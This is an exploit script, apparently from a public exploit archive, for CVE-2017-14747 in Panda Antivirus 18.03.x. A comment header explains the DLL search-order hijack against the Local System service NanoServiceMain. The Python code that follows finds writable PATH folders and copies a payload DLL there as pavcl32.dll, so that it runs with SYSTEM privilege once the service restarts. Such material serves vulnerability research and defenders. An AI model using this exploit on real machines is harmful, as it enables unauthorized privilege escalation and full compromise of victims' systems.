#
# Title :  Panda Antivirus 18.03.x - Privilege Escalation
# Date : 18/10/2017
# Author : 0x09AL (https://twitter.com/0x09AL)
# CVE : CVE-2017-14747
# Tested on: Panda Antivirus 18.03.0 - Windows 7 
# Vendor : https://www.pandasecurity.com/
# Vulnerability Description:
# When Panda Antivirus is installed a service named NanoServiceMain is installed also and runs as Local System.
# In the code there is a call to LoadLibrary("pavcl32.dll") which causes this problem.
# By default when LoadLibrary isn't called with full path Windows will search the actual directory and then the ones that are in the PATH environment. 
# To Exploit this vulnerability when need to put a DLL payload in a writable PATH directory.
# Generate a DLL Payload and name it payload.dll.
# The exploit below will try to find the PATH env folders that are writable and will drop the payload.dll there.
# When the service is restarted or when the computer starts up the payload will execute with the highest privilege.
#
 
import wmi
import os 
import shutil


def isWritable(path):
	try:
		file = path + "\\.tempfile"
		tmp = open(file,"w")
		tmp.close()
		return True
	except IOError as e:
		pass
		return False
		
		
		

PandaService = wmi.WMI().Win32_Service(Name="NanoServiceMain",State="Running")

if(PandaService != []):
	print "[+] Found Panda Antivirus Service [+]"
	folders = os.environ['PATH'].split(";")

	for folder in folders:
		if(isWritable(folder)):
			print "[+] Found writable folder %s [+]" % folder
			print "[+] Copying payload to %s\\pavcl32.dll [+]" % folder
			shutil.copyfile("payload.dll",folder + "\\pavcl32.dll")
			

		
else:
	print "[-] Panda Antivirus not found [-]"
